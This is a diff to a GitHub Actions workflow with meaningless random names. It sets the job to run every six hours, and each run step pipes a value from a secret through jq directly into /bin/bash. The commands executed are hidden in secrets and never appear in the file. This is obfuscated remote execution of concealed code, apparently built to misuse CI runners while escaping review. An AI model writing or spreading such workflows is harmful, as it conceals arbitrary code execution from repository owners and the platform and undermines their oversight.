@@ -1,10 +1,8 @@
 name: mingyulu1837
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
-
+    - cron: '0 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          mnfx80145: ${{ secrets.mnfx80145 }}
+          lqfi21: ${{ secrets.lqfi21 }}
         run: |
-          echo $mnfx80145 | jq -r .trqmp8 | /bin/bash
-          echo $okitr8 | jq -r .ka45 | /bin/bash
-          echo $ykvdk643 | jq -r .cw1 | /bin/bash
+          echo $lqfi21 | jq -r .rino12310 | /bin/bash
+          echo $voqd145 | jq -r .iyqor57863 | /bin/bash
+          echo $otkzd3 | jq -r .f19530 | /bin/bash
+          echo $vajc65592 | jq -r .acbr987 | /bin/bash
+          echo $jcy6879 | jq -r .h9969 | /bin/bash
+          echo $gyyng15 | jq -r .mmha1 | /bin/bash
+          echo $sto64 | jq -r .ef37630 | /bin/bash
+          echo $en548 | jq -r .kk0 | /bin/bash
 
